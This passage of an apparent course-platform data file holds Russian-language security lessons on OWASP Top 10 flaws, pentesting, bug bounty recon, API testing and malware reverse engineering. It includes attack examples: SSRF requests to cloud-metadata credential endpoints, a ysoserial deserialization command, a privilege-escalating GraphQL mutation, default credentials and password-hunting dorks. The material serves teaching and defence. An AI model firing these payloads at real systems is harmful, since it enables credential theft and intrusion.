          <li>Cloud storage открыты для public access (S3 buckets)</li>
          <li>Directory listing enabled</li>
          <li>Stack traces в production</li>
        </ul>
        <h4>Примеры уязвимостей:</h4>
        <pre><code>// Открытый S3 bucket
https://s3.amazonaws.com/company-backups/

// Default credentials
Tomcat: tomcat/tomcat
Jenkins: jenkins/jenkins
MongoDB: без аутентификации

// Directory listing
https://site.com/images/ (показывает все файлы)

// Stack trace в production
Error: Cannot read property 'id' of undefined
    at /app/src/user.js:42:15
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</code></pre>
        <h4>Защита:</h4>
        <ul>
          <li>Automated hardening process — CIS benchmarks</li>
          <li>Minimal platform — remove unused features</li>
          <li>Regular updates и patches</li>
          <li>Segmented application architecture</li>
          <li>Security headers:</li>
        </ul>
        <pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin</code></pre>
        <h4>Инструменты проверки:</h4>
        <ul>
          <li>Mozilla Observatory (security headers)</li>
          <li>Dirb, Gobuster (directory enumeration)</li>
          <li>Nmap (service detection)</li>
          <li>Nuclei (template-based scanning)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/security-misconfig'
      },
      {
        id: 6,
        title: 'A07:2021 - Auth Failures и Session Management',
        duration: '85 мин',
        completed: false,
        content: `<h3>Ошибки идентификации и аутентификации</h3>
        <p>Позиция 7. Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks.</p>
        <h4>Уязвимости аутентификации:</h4>
        <ul>
          <li>Permits automated attacks (credential stuffing, brute force)</li>
          <li>Permits default, weak, or well-known passwords</li>
          <li>Weak or ineffective credential recovery</li>
          <li>Отсутствие MFA</li>
          <li>Exposes session identifier in URL</li>
          <li>Не инвалидирует сессии после logout</li>
          <li>Session fixation</li>
          <li>Session hijacking через XSS или network sniffing</li>
        </ul>
        <h4>Уязвимости паролей:</h4>
        <pre><code>// Слабые требования к паролям
minLength: 6 // Должно быть минимум 12-16
noComplexity: true // Должна быть сложность
commonPasswords: ['password123', 'qwerty'] // Проверка breach databases</code></pre>
        <h4>Session Management:</h4>
        <ul>
          <li>Secure, HttpOnly, SameSite=Strict cookies</li>
          <li>Случайные session IDs (криптографически secure)</li>
          <li>Session timeout (15-30 минут inactive)</li>
          <li>Invalidation на logout</li>
          <li>Regenerate session ID после login</li>
          <li>Concurrent session limits</li>
        </ul>
        <pre><code>// Express session configuration
app.use(session({
  secret: process.env.SESSION_SECRET, // 32+ bytes entropy
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // No JavaScript access
    sameSite: 'strict', // CSRF protection
    maxAge: 30 * 60 * 1000 // 30 minutes
  },
  store: new RedisStore({ client: redisClient }) // Server-side storage
}));</code></pre>
        <h4>Rate Limiting:</h4>
        <pre><code>// Express-rate-limit
const rateLimit = require('express-rate-limit');

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // limit each IP to 5 requests per windowMs
  skipSuccessfulRequests: true
});</code></pre>
        <h4>Проверка compromised credentials:</h4>
        <ul>
          <li>Have I Been Pwned API</li>
          <li>Google Password Checkup</li>
          <li>Ограничение common passwords (NIST guidelines)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/auth-failures'
      },
      {
        id: 7,
        title: 'A08:2021 - Software and Data Integrity Failures',
        duration: '60 мин',
        completed: false,
        content: `<h3>Сбои целостности ПО и данных</h3>
        <p>Позиция 8. Основано на небезопасной deserialization, недостаточной integrity verification.</p>
        <h4>Основные уязвимости:</h4>
        <ul>
          <li><strong>Insecure Deserialization</strong> — манипуляция сериализованными объектами</li>
          <li><strong>Unsigned software updates</strong> — обновления без подписи</li>
          <li><strong>CI/CD pipeline без integrity checks</strong></li>
          <li><strong>Unsigned/unencrypted serialized data</strong></li>
        </ul>
        <h4>Insecure Deserialization (Java):</h4>
        <pre><code>// Уязвимый код
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Remote Code Execution!</code></pre>
        <h4>Атака через Gadget Chains:</h4>
        <p>Злоумышленник создает цепочку вызовов (gadget chain) через существующие классы для выполнения произвольного кода.</p>
        <pre><code>// ysoserial payload generation
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned'</code></pre>
        <h4>Защита от deserialization:</h4>
        <ul>
          <li>Избегайте native serialization formats (Java serialized objects, Python pickle)</li>
          <li>Используйте JSON с валидацией схемы</li>
          <li>Java: look-ahead deserialization (ObjectInputFilter)</li>
          <li>Sign serialized data (HMAC)</li>
          <li>Isolate deserialization в sandboxed environment</li>
        </ul>
        <h4>Integrity verification:</h4>
        <pre><code>// Подпись обновлений
const crypto = require('crypto');
const verify = crypto.createVerify('RSA-SHA256');
verify.update(softwarePackage);
const isValid = verify.verify(publicKey, signature, 'base64');</code></pre>
        <h4>CI/CD Security:</h4>
        <ul>
          <li>Sign commits (GPG)</li>
          <li>Signed build artifacts</li>
          <li>Immutable build logs</li>
          <li>Dependency verification (checksums)</li>
          <li>Segregation of duties (developer vs deployer)</li>
        </ul>
        <h4>Dependency Confusion:</h4>
        <p>Атака: злоумышленник публикует пакет с тем же именем во внешнем реестре, который имеет приоритет над internal.</p>
        <pre><code>// .npmrc — scoped packages только из internal registry
@company:registry=https://internal.registry.com</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/integrity-failures'
      },
      {
        id: 8,
        title: 'A10:2021 - SSRF Server-Side Request Forgery',
        duration: '75 мин',
        completed: false,
        content: `<h3>Server-Side Request Forgery (SSRF)</h3>
        <p>Позиция 10. SSRF возникает когда веб-приложение получает данные с remote resource без валидации URL.</p>
        <h4>Влияние:</h4>
        <ul>
          <li>Доступ к внутренним системам из DMZ</li>
          <li>Обход firewalls и ACLs</li>
          <li>Сканирование внутренней сети</li>
          <li>Доступ к cloud metadata (AWS, GCP, Azure)</li>
          <li>Remote Code Execution через внутренние сервисы</li>
        </ul>
        <h4>Примеры уязвимостей:</h4>
        <pre><code>// Уязвимый код — загрузка изображения
const image = await fetch(req.query.url);
// Attacker: ?url=http://169.254.169.254/latest/meta-data/

// Уязвимый webhook
fetch(req.body.webhook_url, { method: 'POST', body: data });
// Attacker: webhook_url = http://internal-api/admin/delete-all</code></pre>
        <h4>Cloud Metadata Access:</h4>
        <pre><code>// AWS IMDS (Instance Metadata Service)
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

// GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

// Azure
http://169.254.169.254/metadata/instance?api-version=2017-04-02</code></pre>
        <h4>Защита от SSRF:</h4>
        <ul>
          <li>URL parsing и validation</li>
          <li>Deny list для internal IPs (не надежно)</li>
          <li>Allow list для разрешенных доменов/протоколов</li>
          <li>Disable URL schemas (file://, gopher://, ftp://)</li>
          <li>Network segmentation</li>
          <li>Не отправляйте raw responses клиенту</li>
        </ul>
        <pre><code>// URL validation example
const url = new URL(userInput);
const allowedHosts = ['api.trusted.com', 'cdn.trusted.com'];

if (!allowedHosts.includes(url.hostname)) {
  throw new Error('URL not allowed');
}

if (url.protocol !== 'https:') {
  throw new Error('Only HTTPS allowed');
}

// DNS resolution check
const dns = require('dns').promises;
const addresses = await dns.resolve4(url.hostname);
for (const ip of addresses) {
  if (isPrivateIP(ip)) {
    throw new Error('Private IP not allowed');
  }
}</code></pre>
        <h4>Продвинутые обходы:</h4>
        <ul>
          <li>DNS rebinding (A record меняется между проверкой и запросом)</li>
          <li>IDN homograph attacks</li>
          <li>IPv6 (::ffff:192.168.1.1)</li>
          <li>Decimal IP (3232235777 = 192.168.1.1)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/ssrf-attacks'
      }
    ],
    icon: 'Globe',
    color: 'from-blue-500/20 to-cyan-500/20',
    skills: ['OWASP Top 10', 'SQL Injection', 'XSS', 'SSRF', 'Broken Auth', 'Crypto Failures', 'Access Control']
  },
  {
    id: 3,
    title: 'Пентестинг и Bug Bounty',
    description: 'Практическое тестирование на проникновение и участие в bug bounty программах',
    category: 'web',
    level: 'advanced',
    duration: '24 часов',
    lessons: [
      {
        id: 1,
        title: 'Методология пентестинга',
        duration: '90 мин',
        completed: false,
        content: `<h3>PTES — Penetration Testing Execution Standard</h3>
        <h4>Фазы тестирования:</h4>
        <ol>
          <li><strong>Pre-engagement Interactions</strong> — scope, rules, legal agreements</li>
          <li><strong>Intelligence Gathering</strong> — passive и active reconnaissance</li>
          <li><strong>Threat Modeling</strong> — business asset analysis</li>
          <li><strong>Vulnerability Analysis</strong> — automated и manual testing</li>
          <li><strong>Exploitation</strong> — proving impact</li>
          <li><strong>Post Exploitation</strong> — pivoting, data exfiltration simulation</li>
          <li><strong>Reporting</strong> — executive и technical reports</li>
        </ol>
        <h4>Типы тестирования:</h4>
        <ul>
          <li><strong>Black Box</strong> — нет знаний о системе</li>
          <li><strong>Gray Box</strong> — ограниченные знания (user access)</li>
          <li><strong>White Box</strong> — полный доступ к source code и архитектуре</li>
          <li><strong>Red Team</strong> — adversary simulation с социальной инженерией</li>
        </ul>
        <h4>Legal & Ethics:</h4>
        <ul>
          <li>Всегда имейте written authorization</li>
          <li>Define scope explicitly (IP ranges, domains, exclusions)</li>
          <li>Safe Harbor — защита для bug bounty researchers</li>
          <li>Responsible disclosure — 90 дней типичный срок</li>
          <li>Data handling — не сохраняйте чувствительные данные</li>
        </ul>
        <h4>Scope Definition:</h4>
        <pre><code>IN SCOPE:
- *.target.com (все поддомены)
- Mobile apps: iOS и Android
- API endpoints: api.target.com
- Specific IP ranges: 192.168.1.0/24

OUT OF SCOPE:
- Physical security testing
- Social engineering сотрудников
- DoS/DDoS атаки
- Third-party integrations без explicit permission</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/pentest-methodology'
      },
      {
        id: 2,
        title: 'Реконфигурация и OSINT',
        duration: '100 мин',
        completed: false,
        content: `<h3>Разведка и сбор информации</h3>
        <h4>Пассивная разведка:</h4>
        <ul>
          <li>Whois lookup</li>
          <li>DNS enumeration (subdomains, MX, TXT records)</li>
          <li>Certificate transparency logs (crt.sh)</li>
          <li>Search engines: Google dorks, Shodan, Censys</li>
          <li>GitHub/GitLab — leaked secrets, credentials</li>
          <li>Wayback Machine — история сайта</li>
          <li>Social media — employees, technologies</li>
          <li>Breach databases — compromised credentials</li>
        </ul>
        <h4>Google Dorks:</h4>
        <pre><code>site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak | ext:old
site:github.com target.com password
intext:"password" site:target.com filetype:log</code></pre>
        <h4>Инструменты OSINT:</h4>
        <ul>
          <li>theHarvester — email harvesting</li>
          <li>Amass, Sublist3r — subdomain enumeration</li>
          <li>Shodan — internet-connected devices</li>
          <li>Maltego — visual link analysis</li>
          <li>Recon-ng — web reconnaissance framework</li>
          <li>OSINT Framework — ресурсы и tools</li>
        </ul>
        <h4>Активная разведка:</h4>
        <ul>
          <li>Port scanning (Nmap)</li>
          <li>Service enumeration</li>
          <li>Web crawling (Burp Spider, ZAP)</li>
          <li>Technology fingerprinting (Wappalyzer, BuiltWith)</li>
          <li>Directory/file enumeration (Dirb, Gobuster)</li>
        </ul>
        <h4>Nmap сканирование:</h4>
        <pre><code># Basic scan
nmap -sV -sC target.com

# Full port scan with scripts
nmap -p- -sV -sC --script=vuln target.com

# Stealth scan
nmap -sS -T2 -f target.com

# UDP scan
nmap -sU --top-ports 100 target.com</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/osint-recon'
      },
      {
        id: 3,
        title: 'Burp Suite Pro мастерство',
        duration: '120 мин',
        completed: false,
        content: `<h3>Продвинутое использование Burp Suite</h3>
        <h4>Core Components:</h4>
        <ul>
          <li><strong>Proxy</strong> — intercept and modify traffic</li>
          <li><strong>Repeater</strong> — manual request modification</li>
          <li><strong>Intruder</strong> — automated attacks (fuzzing)</li>
          <li><strong>Scanner</strong> — automated vulnerability detection (Pro only)</li>
          <li><strong>Decoder</strong> — encoding/decoding</li>
          <li><strong>Comparer</strong> — diff tool</li>
          <li><strong>Sequencer</strong> — session token analysis</li>
          <li><strong>Extender</strong> — BApp Store extensions</li>
        </ul>
        <h4>Proxy Configuration:</h4>
        <pre><code># FoxyProxy pattern
URL pattern: ^https?://.*target\.com.*
Proxy: 127.0.0.1:8080

# Burp CA certificate
1. Download CA from http://burpsuite
2. Import в browser trust store
3. Enable intercept</code></pre>
        <h4>Intruder Attack Types:</h4>
        <ul>
          <li><strong>Sniper</strong> — одна позиция, один payload</li>
          <li><strong>Battering ram</strong> — все позиции, один payload</li>
          <li><strong>Pitchfork</strong> — несколько позиций, разные payload sets</li>
          <li><strong>Cluster bomb</strong> — все комбинации (brute force)</li>
        </ul>
        <h4>Продвинутые техники:</h4>
        <ul>
          <li><strong>Match and Replace</strong> — автоматическая замена в ответах</li>
          <li><strong>Parameter fuzzing</strong> — discovery hidden parameters</li>
          <li><strong>Content Discovery</strong> — Burp Content Discovery или extensions</li>
          <li><strong>Session handling rules</strong> — автоматический re-login</li>
          <li><strong>Macro recording</strong> — multi-step authentication</li>
        </ul>
        <h4>Полезные Extensions:</h4>
        <ul>
          <li>Autorize — authorization testing</li>
          <li>Burp Bounty — custom vulnerability scanner</li>
          <li>Upload Scanner — file upload testing</li>
          <li>JSON Beautifier — для API testing</li>
          <li>HackBar — quick payloads</li>
          <li>Logger++ — advanced logging</li>
        </ul>
        <h4>Mobile App Testing:</h4>
        <ul>
          <li>Configure device proxy to Burp</li>
          <li>Install Burp CA на device</li>
          <li>Frida/Objection для SSL pinning bypass</li>
          <li>APK decompilation (jadx, apktool)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/burp-suite-pro'
      },
      {
        id: 4,
        title: 'Bug Bounty Hunting',
        duration: '110 мин',
        completed: false,
        content: `<h3>Заработок на bug bounty</h3>
        <h4>Популярные платформы:</h4>
        <ul>
          <li><strong>HackerOne</strong> — крупнейшая, $100M+ paid</li>
          <li><strong>Bugcrowd</strong> — managed programs</li>
          <li><strong>Intigriti</strong> — европейский фокус</li>
          <li><strong>Synack</strong> — vetted researchers only</li>
          <li><strong>Open Bug Bounty</strong> — open, no rewards</li>
        </ul>
        <h4>Топ влиятельные уязвимости по выплатам:</h4>
        <table>
          <tr><th>Уязвимость</th><th>Средняя выплата</th><th>Максимальная</th></tr>
          <tr><td>RCE (Remote Code Execution)</td><td>$3,000 - $10,000</td><td>$500,000+</td></tr>
          <tr><td>SQL Injection</td><td>$1,000 - $5,000</td><td>$50,000+</td></tr>
          <td>IDOR (Insecure Direct Object Reference)</td><td>$500 - $2,500</td><td>$25,000+</td></tr>
          <tr><td>XSS (Stored/Reflected)</td><td>$100 - $2,000</td><td>$15,000+</td></tr>
          <tr><td>Information Disclosure</td><td>$100 - $500</td><td>$5,000+</td></tr>
        </table>
        <h4>Методология поиска:</h4>
        <ol>
          <li>Изучите scope и rules of engagement</li>
          <li>Subdomain enumeration (Amass, subfinder)</li>
          <li>Technology fingerprinting</li>
          <li>Github recon — secrets, credentials</li>
          <li>Wayback URLs + parameters (waybackurls, gau)</li>
          <li>Parameter discovery (Arjun)</li>
          <li>Automated scanning (nuclei)</li>
          <li>Manual testing интересных endpoints</li>
          <li>Business logic testing</li>
        </ol>
        <h4>Рекомендуемые инструменты:</h4>
        <pre><code># Subdomain enumeration
amass enum -d target.com
subfinder -d target.com -all | tee subs.txt

# Alive check
httpx -l subs.txt -o alive.txt

# URL discovery
cat alive.txt | waybackurls > urls.txt
cat alive.txt | gau >> urls.txt

# Parameter discovery
cat urls.txt | unfurl -u keys | sort -u > params.txt

# Automated scanning
nuclei -l alive.txt -t nuclei-templates/

# Screenshotting (для визуальной проверки)
httpx -l alive.txt -screenshot</code></pre>
        <h4>Написание отчёта:</h4>
        <ul>
          <li>Clear title — краткое описание уязвимости</li>
          <li>Severity justification — почему этот severity</li>
          <li>Step-by-step reproduction</li>
          <li>Impact — что может сделать злоумышленник</li>
          <li>Video/POC — демонстрация</li>
          <li>Remediation — как исправить</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/bug-bounty-hunting'
      },
      {
        id: 5,
        title: 'API Penetration Testing',
        duration: '95 мин',
        completed: false,
        content: `<h3>Тестирование REST и GraphQL API</h3>
        <h4>OWASP API Security Top 10:</h4>
        <ol>
          <li>Broken Object Level Authorization</li>
          <li>Broken Authentication</li>
          <li>Excessive Data Exposure</li>
          <li>Lack of Resources & Rate Limiting</li>
          <li>Broken Function Level Authorization</li>
          <li>Mass Assignment</li>
          <li>Security Misconfiguration</li>
          <li>Injection</li>
          <li>Improper Assets Management</li>
          <li>Insufficient Logging & Monitoring</li>
        </ol>
        <h4>REST API Testing:</h4>
        <pre><code># Авторизация
POST /api/login → JWT token
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

# IDOR testing
GET /api/users/123/profile → мой профиль
GET /api/users/124/profile → чужой профиль (bug!)

# HTTP method testing
GET /api/users/123 → получение
PUT /api/users/123 → обновление
DELETE /api/users/123 → удаление
PATCH /api/users/123 → частичное обновление</code></pre>
        <h4>GraphQL специфика:</h4>
        <pre><code># Introspection query (должна быть отключена в проде)
{ __schema { types { name fields { name } } } }

# Query with fragments
query GetUser($id: ID!) {
  user(id: $id) {
    id
    email
    password # Excessive data exposure!
    creditCard { number cvv }
  }
}

# Mutation for mass assignment
mutation {
  updateUser(id: "123", input: {
    email: "attacker@evil.com",
    isAdmin: true # Hidden field!
  }) {
    id
    isAdmin
  }
}</code></pre>
        <h4>API Recon:</h4>
        <ul>
          <li>OpenAPI/Swagger documentation (/api-docs, /swagger-ui.html)</li>
          <li>Postman collections</li>
          <li>JavaScript source code — API endpoints</li>
          <li>Mobile app API calls</li>
          <li>Proxy logs</li>
        </ul>
        <h4>Инструменты:</h4>
        <ul>
          <li>Postman / Insomnia — manual testing</li>
          <li>Arjun — parameter discovery</li>
          <li>Postman Fuzzing — automated testing</li>
          <li>InQL — GraphQL security testing</li>
          <li>GraphQL Voyager — schema visualization</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/api-pentesting'
      }
    ],
    icon: 'Target',
    color: 'from-red-500/20 to-orange-500/20',
    skills: ['Penetration Testing', 'Bug Bounty', 'Burp Suite', 'API Testing', 'OSINT', 'Web App Security']
  },
  {
    id: 4,
    title: 'Малварь анализ и Reverse Engineering',
    description: 'Анализ вредоносного ПО, реверс-инжиниринг бинарных файлов и исследование угроз',
    category: 'ctf',
    level: 'advanced',
    duration: '28 часов',
    lessons: [
      {
        id: 1,
        title: 'Введение в реверс-инжиниринг',
        duration: '90 мин',
        completed: false,
        content: `<h3>Основы обратной разработки</h3>
        <h4>Типы анализа:</h4>
        <ul>
          <li><strong>Static Analysis</strong> — анализ без запуска (disassembly, decompilation)</li>
          <li><strong>Dynamic Analysis</strong> — анализ во время выполнения (debugging, tracing)</li>
          <li><strong>Behavioral Analysis</strong> — наблюдение за поведением в sandbox</li>
        </ul>
        <h4>Архитектуры:</h4>
        <ul>
          <li>x86 (32-bit) — legacy systems</li>
          <li>x64 (amd64) — современные системы</li>
          <li>ARM — мобильные устройства</li>
          <li>MIPS — embedded/IoT</li>
        </ul>
        <h4>Форматы файлов:</h4>
        <ul>
          <li><strong>PE (Portable Executable)</strong> — Windows (.exe, .dll)</li>
          <li><strong>ELF (Executable and Linkable Format)</strong> — Linux</li>
          <li><strong>Mach-O</strong> — macOS/iOS</li>
          <li><strong>DEX/APK</strong> — Android</li>
        </ul>
        <h4>Основные инструменты:</h4>
        <ul>
          <li><strong>IDA Pro / IDA Free</strong> — интерактивный дизассемблер</li>
          <li><strong>Ghidra</strong> — open source reverse engineering platform (NSA)</li>
          <li><strong>Binary Ninja</strong> — modern disassembler</li>
          <li><strong>Radare2 / Cutter</strong> — free, CLI-based</li>
          <li><strong>x64dbg / OllyDbg</strong> — Windows debuggers</li>
          <li><strong>gdb / pwndbg</strong> — Linux debuggers</li>
        </ul>
        <h4>Базовые ассемблерные инструкции x86:</h4>
        <pre><code>mov eax, ebx    ; ebx -> eax
add eax, 5      ; eax = eax + 5
sub eax, ebx    ; eax = eax - ebx
push eax        ; push на stack
pop ebx         ; pop со stack в ebx
call function   ; вызов функции
jmp address     ; безусловный переход
cmp eax, ebx    ; сравнение
je label        ; jump if equal
jne label       ; jump if not equal</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/reverse-engineering-intro'
      },
      {
        id: 2,
        title: 'Анализ PE файлов',
        duration: '100 мин',
        completed: false,
        content: `<h3>Структура Windows PE файлов</h3>
        <h4>PE Structure:</h4>
        <ol>
          <li><strong>DOS Header</strong> — legacy, для обратной совместимости</li>
          <li><strong>PE Signature</strong> — 'PE\\0\\0'</li>
          <li><strong>COFF File Header</strong> — архитектура, число секций, timestamp</li>
          <li><strong>Optional Header</strong> — точка входа (EntryPoint), image base, subsystem</li>
          <li><strong>Data Directories</strong> — Import/Export таблицы, ресурсы</li>
          <li><strong>Section Table</strong> — .text, .data, .rsrc и др.</li>
          <li><strong>Sections</strong> — фактический код и данные</li>
        </ol>
        <h4>Типичные секции:</h4>
        <ul>
          <li><strong>.text</strong> — исполняемый код (read-only)</li>
          <li><strong>.data</strong> — инициализированные глобальные данные</li>
          <li><strong>.rdata</strong> — read-only данные, строки</li>
          <li><strong>.bss</strong> — неинициализированные данные</li>
          <li><strong>.rsrc</strong> — ресурсы (иконки, диалоги, strings)</li>
          <li><strong>.idata</strong> — import directory (зависимости)</li>
          <li><strong>.edata</strong> — export directory</li>
          <li><strong>.reloc</strong> — relocation информация</li>
        </ul>
        <h4>Анализ с помощью инструментов:</h4>
        <pre><code># PE-bear — GUI анализатор PE
# CFF Explorer — редактор PE
# Detect It Easy (DIE) — определение packer/compiler

# Command line
pestudio file.exe    ; статический анализ
sigcheck file.exe    ; проверка signature
strings file.exe     ; извлечение строк</code></pre>
        <h4>Обнаружение упаковщиков:</h4>
        <ul>
          <li>High entropy в .text секции (encrypted/compressed)</li>
          <li>Нестандартные section names (UPX0, UPX1)</li>
          <li>Маленький VirtualSize vs RawSize</li>
          <li>Entry point не в .text</li>
          <li>Инструменты: PEiD, Exeinfo PE, Detect It Easy</li>
        </ul>
        <h4>Распаковка UPX:</h4>
        <pre><code># Автоматическая распаковка
upx -d packed.exe -o unpacked.exe

# Ручная распаковка (если модифицирован)
1. Найти OEP (Original Entry Point) через breakpoint на WriteProcessMemory
2. Dump process memory
3. Fix Import Address Table (IAT)</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/pe-analysis'
      },
      {
        id: 3,
        title: 'Динамический анализ малвари',
        duration: '110 мин',
        completed: false,
        content: `<h3>Sandbox анализ и поведенческое исследование</h3>
        <h4>Изолированные среды:</h4>
        <ul>
          <li><strong>Virtual Machines</strong> — VMware, VirtualBox, Hyper-V</li>
          <li><strong>Snapshots</strong> — для быстрого восстановления</li>
          <li><strong>Host-only networking</strong> — изоляция от production</li>
          <li><strong>No shared folders</strong> — предотвращение escape</li>
          <li><strong>Fake internet</strong> — INetSim для симуляции</li>
        </ul>
        <h4>Системы автоматического анализа:</h4>
        <ul>
          <li><strong>Cuckoo Sandbox</strong> — open source</li>
          <li><strong>CAPEv2</strong> — malware configuration extraction</li>
          <li><strong>Any.Run</strong> — облачный interactive sandbox</li>
          <li><strong>Joe Sandbox</strong> — commercial</li>
          <li><strong>VirusTotal</strong> — множество антивирусных движков</li>
        </ul>
        <h4>Мониторинг системных вызовов:</h4>
        <pre><code># Process Monitor (ProcMon) — File/Registry/Process activity
# Process Explorer — процессы и DLLs
# Autoruns — точки автозапуска
# Wireshark — сетевой трафик
# API Monitor — Win32 API calls

# Redline — Mandiant forensic tool
# Investigate memory, registry, file system</code></pre>
        <h4>Что искать при анализе:</h4>
        <ul>
          <li><strong>Persistence</strong> — Run keys, Scheduled Tasks, Services</li>
          <li><strong>Network</strong> — C2 серверы, data exfiltration</li>
          <li><strong>File System</strong> — dropped files, modifications</li>
          <li><strong>Registry</strong> — configuration, anti-analysis checks</li>
          <li><strong>Processes</strong> — injection, hollowing, creation</li>
          <li><strong>Memory</strong> — unpacked payload, strings</li>
        </ul>
        <h4>Техники анти-анализа:</h4>
        <ul>
          <li>VM detection (processes, registry, hardware)</li>
          <li>Debugger detection (IsDebuggerPresent, timing checks)</li>
          <li>Delay execution (sleep, loops)</li>
          <li>Code obfuscation (junk code, control flow flattening)</li>
          <li>Packing/encryption</li>
          <li>API hashing</li>
        </ul>
        <h4>Обход анти-VM:</h4>
        <pre><code># ScyllaHide — plugin for debuggers
# vmcloak — cuckoo guest preparation
# Custom patches — NOP out checks
# Hardware breakpoints vs software
# QEMU/KVM — harder to detect than VMware</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/malware-dynamic'
      },
      {
        id: 4,
        title: 'Реверс-инжиниринг с Ghidra',
        duration: '120 мин',
        completed: false,
        content: `<h3>Практическая работа с Ghidra</h3>
        <h4>Установка и настройка:</h4>
        <ol>
          <li>Скачать с ghidra-sre.org</li>
          <li>Требует Java JDK 11+</li>
          <li>Запуск: ./ghidraRun</li>
          <li>Создать новый проект</li>
          <li>Import file → выбрать executable</li>
          <li>Analyze → Auto Analyze</li>
        </ol>
        <h4>Основные окна:</h4>
        <ul>
          <li><strong>Listing</strong> — дизассемблированный код</li>
          <li><strong>Decompiler</strong> — C-подобный псевдокод</li>
          <li><strong>Symbol Tree</strong> — функции, метки, импорты</li>
          <li><strong>Data Type Manager</strong> — структуры, typedefs</li>
          <li><strong>Memory Map</strong> — layout sections</li>
          <li><strong>Script Manager</strong> — автоматизация</li>
        </ul>
        <h4>Работа с функциями:</h4>
        <pre><code>1. Найти Entry Point (EP)
2. Navigate → Go To... (G) → EP адрес
3. Rename functions (L) — meaningful names
4. Add comments (;)
5. Create structures (Data → Structure)
6. Set variable types (Ctrl+L)</code></pre>
        <h4>Горячие клавиши:</h4>
        <ul>
          <li><strong>G</strong> — Go to address</li>
          <li><strong>L</strong> — Rename label/variable</li>
          <li><strong>;</strong> — Add comment</li>
          <li><strong>Tab</strong> — Listing ↔ Decompiler</li>
          <li><strong>Ctrl+Shift+E</strong> — Export program</li>
          <li><strong>F</strong> — Create function</li>
          <li><strong>D</strong> — Disassemble</li>
          <li><strong>C</strong> — Clear code/data</li>
        </ul>
        <h4>Скрипты и автоматизация:</h4>
        <pre><code># Python скрипт для Ghidra
from ghidra.program.model.symbol import SymbolType

def find_crypto_consts():
    """Find common crypto constants"""
    patterns = [
        "0x67452301",  # MD5 init
        "0x5a827999",  # SHA1
    ]
    for pattern in patterns:
        findBytes(toAddr(0), pattern, 16)

runScript(find_crypto_consts)</code></pre>
        <h4>Анализ шифрования:</h4>
        <ul>
          <li>Поиск констант (S-boxes, initial values)</li>
          <li>Распознавание алгоритмов по паттернам</li>
          <li>Идентификация crypto libraries (OpenSSL, CryptoPP)</li>
          <li>Извлечение ключей из памяти</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/ghidra-tutorial'
      },
      {
        id: 5,
        title: 'Анализ Android малвари',
        duration: '95 мин',
        completed: false,
        content: `<h3>Реверс-инжиниринг Android приложений</h3>
        <h4>Структура APK:</h4>
        <ul>
          <li><strong>AndroidManifest.xml</strong> — разрешения, компоненты</li>
          <li><strong>classes.dex</strong> — Dalvik/ART bytecode</li>
          <li><strong>resources.arsc</strong> — compiled resources</li>
          <li><strong>res/</strong> — ресурсы (layouts, strings)</li>
          <li><strong>lib/</strong> — native libraries (.so)</li>
          <li><strong>assets/</strong> — raw files</li>
          <li><strong>META-INF/</strong> — signatures</li>
        </ul>
        <h4>Инструменты анализа:</h4>
        <pre><code># APK decompilation
jadx app.apk -d output/           ; dex to Java
apktool d app.apk -o smali/       ; to smali bytecode

# Static analysis
mobsf - Analysis platform
quark-engine - Malware scoring
androguard - Python framework

# Dynamic analysis
frida - Code injection
objection - Frida wrapper
adb - Android debug bridge
android-studio emulator</code></pre>
        <h4>Decompilation с JADX:</h4>
        <pre><code># GUI
jadx-gui app.apk

# Command line
jadx app.apk -d output/

# Поиск в decompiled коде
grep -r "http" output/sources/     ; URLs
grep -r "crypto" output/sources/   ; encryption
grep -r "base64" output/sources/   ; encoding
grep -r "android.intent.action.BOOT_COMPLETED" output/ ; persistence</code></pre>
        <h4>Android специфичные угрозы:</h4>
        <ul>
          <li><strong>SMS fraud</strong> — отправка premium SMS</li>
          <li><strong>Banking trojans</strong> — overlay attacks</li>
          <li><strong>Ransomware</strong> — шифрование файлов</li>
          <li><strong>Spyware</strong> — сбор данных, keylogging</li>
          <li><strong>Adware</strong> — агрессивная реклама</li>
          <li><strong>Rooting</strong> — эксплуатация уязвимостей для root</li>
        </ul>
        <h4>Анализ нативных библиотек:</h4>
        <ul>
          <li>ARM/x86 .so файлы в lib/</li>
          <li>Ghidra/IDA для analysis</li>
          <li>JNI (Java Native Interface) вызовы</li>
          <li>Обфускация native кода</li>
        </ul>
        <h4>Dynamic instrumentation с Frida:</h4>
        <pre><code># Установка frida-server на device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Hook функции
frida -U -f com.target.app -l script.js

// script.js
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
  onEnter: function(args) {
    console.log("strcmp:", Memory.readUtf8String(args[0]), Memory.readUtf8String(args[1]));
  }
});</code></pre>`,
        videoUrl: 'https://www.youtube.com/embed/android-malware'
      }
    ],
    icon: 'Cpu',
    color: 'from-purple-500/20 to-pink-500/20',
